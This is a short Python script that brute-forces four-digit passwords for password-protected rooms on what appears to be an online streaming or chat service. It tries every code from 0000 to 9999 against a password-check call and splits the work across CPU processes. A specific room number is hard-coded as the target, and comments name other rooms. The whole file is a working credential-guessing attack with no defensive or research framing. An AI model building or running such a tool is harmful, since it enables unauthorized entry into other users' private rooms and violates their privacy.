import time
from ctypes import c_bool
from math import ceil
from multiprocessing import cpu_count, Process, Value

from Util import checkpassword, getroomid


def checkpass(status, roomid, start, end):
    for i in range(start, end):
        if not status.value:
            password = str(i).zfill(4)
            print(password)
            response = checkpassword(roomid, password)
            if 'success' in response.text:
                status.value = True
                return password
        else:
            return None


def process(status, roomid, start, end):
    password = checkpass(status, roomid, start, end)
    if password is not None:
        print('the answer is in ' + str(start) + '~' + str(end) + '. And the room password is ' + password)
    else:
        print('the answer is not in ' + str(start) + '~' + str(end))


if __name__ == '__main__':
    start = time.time()
    roomid = None
    if not roomid:
        # 1201783 bj
        # 1271280 self
        roomid = getroomid(userid=None, roomnum='1198640')
    # print(roomid)

    status = Value(c_bool, False)
    cpucount = cpu_count()

    limit = 10000
    unit = ceil(limit / cpucount)
    p_list = []
    for i in range(cpucount):
        # print(str(unit * i) + '/' + str(unit * (i + 1) if unit * (i + 1) < limit else limit))
        p = Process(target=process,
                    args=(status, roomid, unit * i, unit * (i + 1) if unit * (i + 1) < limit else limit))
        p.start()
        p_list.append(p)

    for p in p_list:
        p.join()

    end = time.time()

    print('take %s seconds' % (end - start))
